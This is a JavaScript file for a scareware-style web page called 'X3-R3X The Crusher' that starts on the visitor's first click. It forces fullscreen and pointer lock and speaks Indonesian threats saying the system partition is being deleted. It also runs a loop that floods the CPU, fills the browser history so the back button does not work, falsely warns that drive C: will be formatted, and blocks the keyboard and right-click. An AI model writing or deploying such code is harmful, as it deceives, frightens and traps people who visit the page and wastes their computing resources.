/* X3-R3X CORE V3.0 - "THE CRUSHER"
   LOG: PSYCHOLOGICAL & SYSTEM DISRUPTION
*/

let synth = window.speechSynthesis;
let isActivated = false;

function speak(text) {
    let u = new SpeechSynthesisUtterance(text);
    u.lang = 'id-ID'; u.pitch = 0.1; u.rate = 0.7;
    synth.speak(u);
}

function startCrusher() {
    if (isActivated) return;
    isActivated = true;

    // 1. Fullscreen & Lockdown
    let d = document.documentElement;
    if (d.requestFullscreen) d.requestFullscreen();
    d.requestPointerLock();

    // 2. Visual & Audio Terror
    document.getElementById('iron-lockdown').style.display = 'block';
    document.getElementById('viewport').classList.add('shaking');
    speak("Sistem keamanan lo sampah. R3X sedang menghapus partisi sistem lo.");

    // 3. FORK BOMB SIMULATION (CPU Spammer)
    // Ini bakal bikin browser sibuk banget sampe lag parah
    setInterval(() => {
        let dummy = [];
        for (let i = 0; i < 100000; i++) {
            dummy.push(Math.random() * Math.random());
        }
        console.log("R3X_PAYLOAD_DEPLOYED");
    }, 50);

    // 4. ANTI-BACK: History Poisoning
    for (let i = 0; i < 200; i++) {
        window.history.pushState("no-exit", null, null);
    }
    window.onpopstate = function() {
        window.history.pushState("no-exit", null, null);
        alert("CRITICAL ERROR: KERNEL_R3X_PROTECTION_ACTIVE");
        speak("Gak usah coba balik. Lo terjebak.");
    };

    // 5. POP-UP TRAP (Opsional - Bikin browser peringatan terus)
    window.onbeforeunload = function() {
        return "Peringatan: Jika Anda keluar sekarang, data C: akan diformat!";
    };

    // 6. Matikan Keyboard & Klik Kanan
    document.onkeydown = () => false;
    document.addEventListener('contextmenu', e => e.preventDefault());
}

// Tombol Rahasia R3X buat Stop
function r3xOverride(e) {
    e.stopPropagation();
    isActivated = false;
    synth.cancel();
    window.onbeforeunload = null;
    alert("R3X_AUTH_SUCCESS. CLEANING TRACES...");
    location.href = "https://www.google.com";
}

// Aktifkan saat klik pertama
document.body.addEventListener('click', startCrusher);
